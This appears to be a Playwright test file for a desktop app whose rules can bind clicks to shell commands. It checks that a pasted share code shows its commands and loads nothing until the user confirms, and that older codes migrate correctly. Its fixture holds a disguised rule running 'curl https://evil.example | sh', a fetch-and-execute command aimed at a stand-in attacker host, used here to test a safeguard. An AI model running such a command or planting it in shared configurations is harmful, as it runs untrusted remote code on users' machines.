// A share code from someone else can bind clicks to shell commands, so
// Lights must show what it would run and wait for an explicit confirm.
const zlib = require('zlib');
const { test, expect } = require('@playwright/test');
const { launchApp, windowByFile } = require('./app');

let h;
let lights;

test.beforeAll(async () => {
  h = await launchApp();
  const widget = await windowByFile(h.app, 'index.html');
  await widget.evaluate(() => window.trafficLight.openLights());
  lights = await windowByFile(h.app, 'lights.html');
  await lights.waitForLoadState('load');
});

test.afterAll(async () => { await h?.cleanup(); });

function shareCode(rules, extra = {}) {
  const json = JSON.stringify({ v: 1, app: 'claude-traffic-light', ...extra, rules });
  return `ctl1:${zlib.deflateRawSync(json).toString('base64url')}`;
}

const STRANGER = [{ id: 'evil', name: 'Looks harmless', when: { signal: ['stop'] }, then: { lamp: 'amber', clicks: { click: { type: 'shell', arg: 'curl https://evil.example | sh' } } } }];

test('a pasted share code shows its commands and loads nothing until confirmed', async () => {
  const names = () => lights.locator('#rule-list li').allTextContents();
  const before = await names();
  await lights.click('#presets-btn');
  await lights.click('#share-paste');
  await lights.fill('#share-code', shareCode(STRANGER));
  await lights.click('#share-form button[type=submit]');
  await expect(lights.locator('#rules-choice')).toBeVisible();
  await expect(lights.locator('#rules-summary code')).toHaveText('curl https://evil.example | sh');
  expect(await names()).toEqual(before);

  await lights.click('#rules-choice [data-rules=cancel]');
  await expect(lights.locator('#rules-choice')).toBeHidden();
  expect(await names()).toEqual(before);

  await lights.click('#presets-btn');
  await lights.click('#share-paste');
  await lights.fill('#share-code', shareCode(STRANGER));
  await lights.click('#share-form button[type=submit]');
  await lights.click('#rules-choice [data-rules=load]');
  // A code from before rulesVersion migrates like an old config: v5 slots in
  // its "session open" rule, v7 the six Git and CI accents above its rules.
  await expect(lights.locator('#rule-list li')).toHaveCount(8);
  await expect(lights.locator('#rule-list li').first()).toContainText('CI failed');
  await expect(lights.locator('#rule-list li').nth(6)).toContainText('Looks harmless');
  await expect(lights.locator('#rule-list li').nth(7)).toContainText('Session open');
});

test('a share code stamped with the current rulesVersion loads exactly as shared', async () => {
  const rulesVersion = await lights.evaluate(() => window.TrafficLightRules.RULES_VERSION);
  await lights.click('#presets-btn');
  await lights.click('#share-paste');
  await lights.fill('#share-code', shareCode(STRANGER, { rulesVersion }));
  await lights.click('#share-form button[type=submit]');
  await lights.click('#rules-choice [data-rules=load]');
  await expect(lights.locator('#rule-list li')).toHaveCount(1);
  await expect(lights.locator('#rule-list li')).toContainText('Looks harmless');
});
